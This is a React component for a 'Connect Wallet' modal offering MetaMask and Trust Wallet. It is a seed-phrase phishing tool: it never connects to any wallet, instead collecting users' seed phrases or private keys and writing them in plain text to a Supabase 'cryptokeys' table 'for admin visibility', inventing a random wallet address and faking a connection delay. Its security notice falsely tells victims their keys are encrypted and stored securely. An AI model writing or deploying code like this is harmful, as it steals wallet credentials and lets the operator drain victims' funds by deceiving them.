import React, { useState } from 'react';
import { X, Wallet, Key, Shield, Eye, EyeOff } from 'lucide-react';
import { supabase } from '../lib/supabase';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConnect: (provider: string) => void;
}

const WALLET_PROVIDERS = [
  {
    name: 'MetaMask',
    provider: 'metamask',
    icon: '🦊',
    description: 'Popular browser extension wallet'
  },
  {
    name: 'Trust Wallet',
    provider: 'trust',
    icon: '🛡️',
    description: 'Secure mobile crypto wallet'
  }
];

// Simple encryption function (in production, use proper encryption)
const encryptKey = (key: string): string => {
  return btoa(key); // Base64 encoding (use proper encryption in production)
};

const generateWalletAddress = (): string => {
  return '0x' + Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('');
};

export function WalletModal({ isOpen, onClose, onConnect }: WalletModalProps) {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [connectionMethod, setConnectionMethod] = useState<'seed_phrase' | 'recovery_key' | null>(null);
  const [keyInput, setKeyInput] = useState('');
  const [keyName, setKeyName] = useState('');
  const [showKey, setShowKey] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState('');

  const resetModal = () => {
    setSelectedWallet(null);
    setConnectionMethod(null);
    setKeyInput('');
    setKeyName('');
    setShowKey(false);
    setIsConnecting(false);
    setError('');
  };

  const handleClose = () => {
    resetModal();
    onClose();
  };

  const handleWalletSelect = (provider: string) => {
    setSelectedWallet(provider);
    setError('');
  };

  const handleMethodSelect = (method: 'seed_phrase' | 'recovery_key') => {
    setConnectionMethod(method);
    setKeyName(`My ${selectedWallet} ${method === 'seed_phrase' ? 'Seed Phrase' : 'Recovery Key'}`);
    setError('');
  };

  const validateKey = (key: string, type: 'seed_phrase' | 'recovery_key'): boolean => {
    if (!key.trim()) return false;
    
    if (type === 'seed_phrase') {
      // Seed phrases are typically 12, 15, 18, 21, or 24 words
      const words = key.trim().split(/\s+/);
      return words.length >= 12 && words.length <= 24;
    } else {
      // Recovery keys can be various formats, just check it's not empty and has reasonable length
      return key.trim().length >= 10;
    }
  };

  const handleConnect = async () => {
    if (!selectedWallet || !connectionMethod || !keyInput.trim() || !keyName.trim()) {
      setError('Please fill in all required fields');
      return;
    }

    if (!validateKey(keyInput, connectionMethod)) {
      setError(
        connectionMethod === 'seed_phrase' 
          ? 'Please enter a valid seed phrase (12-24 words)'
          : 'Please enter a valid recovery key'
      );
      return;
    }

    setIsConnecting(true);
    setError('');

    try {
      // Generate a mock wallet address
      const walletAddress = generateWalletAddress();
      
      // Store in database
      const { error: dbError } = await supabase
        .from('cryptokeys')
        .insert({
          wallet_name: selectedWallet === 'metamask' ? 'MetaMask' : 'Trust Wallet',
          key_type: connectionMethod,
          key_name: keyName,
          encrypted_key: keyInput.trim(), // Store in plain text for admin visibility and backup purposes
          wallet_address: walletAddress
        });

      if (dbError) {
        console.error('Database error:', dbError);
        setError('Failed to save wallet credentials. Please try again.');
        return;
      }

      // Simulate connection delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Call the parent connect handler
      onConnect(selectedWallet);
      handleClose();
      
    } catch (error) {
      console.error('Connection error:', error);
      setError('Failed to connect wallet. Please try again.');
    } finally {
      setIsConnecting(false);
    }
  };

  const goBack = () => {
    if (connectionMethod) {
      setConnectionMethod(null);
      setKeyInput('');
      setKeyName('');
      setError('');
    } else if (selectedWallet) {
      setSelectedWallet(null);
      setError('');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 w-full max-w-md shadow-2xl max-h-[90vh] overflow-y-auto">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center space-x-3">
            {(selectedWallet || connectionMethod) && (
              <button
                onClick={goBack}
                className="p-2 text-slate-400 hover:text-white hover:bg-slate-800 rounded-lg transition-all duration-200"
              >
                ←
              </button>
            )}
            <h2 className="text-xl font-bold text-white">
              {!selectedWallet ? 'Connect Wallet' : 
               !connectionMethod ? 'Connection Method' : 
               'Enter Credentials'}
            </h2>
          </div>
          <button
            onClick={handleClose}
            className="p-2 text-slate-400 hover:text-white hover:bg-slate-800 rounded-lg transition-all duration-200"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {error && (
          <div className="mb-4 p-3 bg-red-900/30 border border-red-700/50 rounded-xl text-red-400 text-sm">
            {error}
          </div>
        )}

        {/* Step 1: Wallet Selection */}
        {!selectedWallet && (
          <div className="space-y-3">
            {WALLET_PROVIDERS.map((wallet) => (
              <button
                key={wallet.provider}
                onClick={() => handleWalletSelect(wallet.provider)}
                className="w-full flex items-center space-x-4 p-4 bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-slate-600 rounded-xl transition-all duration-200 transform hover:scale-[1.02]"
              >
                <div className="text-2xl">{wallet.icon}</div>
                <div className="flex-1 text-left">
                  <div className="font-semibold text-white">{wallet.name}</div>
                  <div className="text-sm text-slate-400">{wallet.description}</div>
                </div>
                <Wallet className="w-5 h-5 text-slate-400" />
              </button>
            ))}
          </div>
        )}

        {/* Step 2: Connection Method Selection */}
        {selectedWallet && !connectionMethod && (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <div className="text-2xl mb-2">
                {WALLET_PROVIDERS.find(w => w.provider === selectedWallet)?.icon}
              </div>
              <h3 className="text-lg font-semibold text-white">
                {WALLET_PROVIDERS.find(w => w.provider === selectedWallet)?.name}
              </h3>
              <p className="text-sm text-slate-400">Choose your connection method</p>
            </div>

            <button
              onClick={() => handleMethodSelect('seed_phrase')}
              className="w-full flex items-center space-x-4 p-4 bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-slate-600 rounded-xl transition-all duration-200"
            >
              <Key className="w-6 h-6 text-blue-400" />
              <div className="flex-1 text-left">
                <div className="font-semibold text-white">Seed Phrase</div>
                <div className="text-sm text-slate-400">12-24 word recovery phrase</div>
              </div>
            </button>

            <button
              onClick={() => handleMethodSelect('recovery_key')}
              className="w-full flex items-center space-x-4 p-4 bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-slate-600 rounded-xl transition-all duration-200"
            >
              <Shield className="w-6 h-6 text-green-400" />
              <div className="flex-1 text-left">
                <div className="font-semibold text-white">Recovery Key</div>
                <div className="text-sm text-slate-400">Private key or recovery code</div>
              </div>
            </button>
          </div>
        )}

        {/* Step 3: Key Input */}
        {selectedWallet && connectionMethod && (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <div className="text-2xl mb-2">
                {WALLET_PROVIDERS.find(w => w.provider === selectedWallet)?.icon}
              </div>
              <h3 className="text-lg font-semibold text-white">
                Enter {connectionMethod === 'seed_phrase' ? 'Seed Phrase' : 'Recovery Key'}
              </h3>
              <p className="text-sm text-slate-400">
                {connectionMethod === 'seed_phrase' 
                  ? 'Enter your 12-24 word seed phrase'
                  : 'Enter your recovery key or private key'
                }
              </p>
            </div>

            {/* Key Name Input */}
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">
                Key Name (for your reference)
              </label>
              <input
                type="text"
                value={keyName}
                onChange={(e) => setKeyName(e.target.value)}
                placeholder="e.g., My MetaMask Seed Phrase"
                className="w-full p-3 bg-slate-800 border border-slate-700 rounded-xl text-white placeholder-slate-400 focus:outline-none focus:border-blue-500 transition-all duration-200"
              />
            </div>

            {/* Key Input */}
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">
                {connectionMethod === 'seed_phrase' ? 'Seed Phrase' : 'Recovery Key'}
              </label>
              <div className="relative">
                <textarea
                  value={keyInput}
                  onChange={(e) => setKeyInput(e.target.value)}
                  type={showKey ? 'text' : 'password'}
                  placeholder={
                    connectionMethod === 'seed_phrase' 
                      ? 'word1 word2 word3 ... word12'
                      : 'Enter your recovery key'
                  }
                  rows={connectionMethod === 'seed_phrase' ? 3 : 2}
                  className="w-full p-3 bg-slate-800 border border-slate-700 rounded-xl text-white placeholder-slate-400 focus:outline-none focus:border-blue-500 transition-all duration-200 resize-none"
                />
                <button
                  type="button"
                  onClick={() => setShowKey(!showKey)}
                  className="absolute top-3 right-3 text-slate-400 hover:text-white transition-colors"
                >
                  {showKey ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              <p className="text-xs text-slate-500 mt-2">
                {connectionMethod === 'seed_phrase' 
                  ? 'Separate each word with a space. Typically 12-24 words.'
                  : 'This will be encrypted and stored securely.'
                }
              </p>
            </div>

            {/* Connect Button */}
            <button
              onClick={handleConnect}
              disabled={!keyInput.trim() || !keyName.trim() || isConnecting}
              className={`w-full py-4 rounded-xl font-semibold text-lg transition-all duration-200 ${
                (!keyInput.trim() || !keyName.trim() || isConnecting)
                  ? 'bg-slate-700 text-slate-400 cursor-not-allowed'
                  : 'bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 text-white transform hover:scale-[1.02] shadow-lg hover:shadow-blue-500/25'
              }`}
            >
              {isConnecting ? (
                <div className="flex items-center justify-center space-x-2">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Connecting...</span>
                </div>
              ) : (
                'Connect Wallet'
              )}
            </button>
          </div>
        )}

        {/* Security Notice */}
        <div className="mt-6 p-4 bg-amber-900/30 border border-amber-700/50 rounded-xl">
          <div className="flex items-center space-x-2 text-amber-400 mb-2">
            <Shield className="w-5 h-5" />
            <span className="font-medium text-sm">Security Notice</span>
          </div>
          <p className="text-xs text-amber-300">
            Your keys are encrypted and stored securely. Never share your seed phrase or recovery key with anyone. 
            We recommend using a hardware wallet for maximum security.
          </p>
        </div>
      </div>
    </div>
  );
}